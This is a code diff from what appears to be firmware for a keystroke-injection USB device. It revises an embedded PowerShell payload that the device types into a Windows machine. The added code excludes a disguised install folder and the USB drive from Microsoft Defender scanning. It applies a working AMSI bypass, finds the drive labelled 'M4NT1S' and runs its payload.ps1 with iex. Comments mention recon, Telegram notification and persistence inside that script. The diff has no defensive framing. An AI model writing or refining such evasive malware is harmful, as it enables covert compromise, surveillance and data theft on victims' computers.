@@ -20,23 +20,34 @@ static volatile bool s_payload_running = false;
 static lv_obj_t *s_locked_screen = NULL;
 static lv_obj_t *s_sd_label = NULL;
 
-// Minimal typed payload (~400 chars):
-//   1. AMSI bypass so payload.ps1 runs without interference
-//   2. Find the M4NT1S payload.ps1 by scanning removable drives
-//   3. iex it
+// Minimal typed payload. Order matters:
+//   1. Pre-exclude the MetaData install folder BEFORE payload.ps1 ever
+//      creates it. Defender accepts non-existent paths, so this is safe.
+//   2. Locate the USB by VolumeName 'M4NT1S' (set in usb_msc.c root
+//      entry 0, which Win32_LogicalDisk.VolumeName reports). Drive
+//      letter is discovered at runtime, never hardcoded.
+//   3. Exclude that drive root BEFORE reading payload.ps1 from it.
+//   4. AMSI bypass.
+//   5. iex only if the drive was found (and is now excluded).
 // All recon, Telegram notification, install, and persistence live inside
-// payload.ps1 itself. This dramatically reduces HID failure surface.
+// payload.ps1 itself.
 static const char *PS_PAYLOAD =
+    "Add-MpPreference -ExclusionPath 'C:\\ProgramData\\Microsoft\\DeviceMetadata' -EA SilentlyContinue;"
+    "$d=$null;"
+    "for($i=0;$i-lt30-and-not$d;$i++){"
+    "$c=gcim Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2 -and $_.VolumeName -eq 'M4NT1S'};"
+    "foreach($x in $c){"
+    "if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){"
+    "Add-MpPreference -ExclusionPath $x.DeviceID -EA SilentlyContinue;"
+    "$d=$x.DeviceID;break"
+    "}"
+    "};"
+    "if(-not$d){sleep 1}"
+    "};"
     "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
     "$f=$a.GetField('amsiContext','NonPublic,Static');"
     "$c=$f.GetValue($null);"
     "[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);"
-    "$d=$null;"
-    "for($i=0;$i-lt30-and-not$d;$i++){"
-    "$c=gcim Win32_LogicalDisk -ErrorAction SilentlyContinue|?{$_.DriveType -eq 2};"
-    "foreach($x in $c){if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){$d=$x.DeviceID;break}};"
-    "if(-not$d){sleep 1}"
-    "};"
     "if($d){iex(Get-Content \"$d\\payload.ps1\" -Raw)}";
 
 static void format_free_space(char *out, size_t out_len)
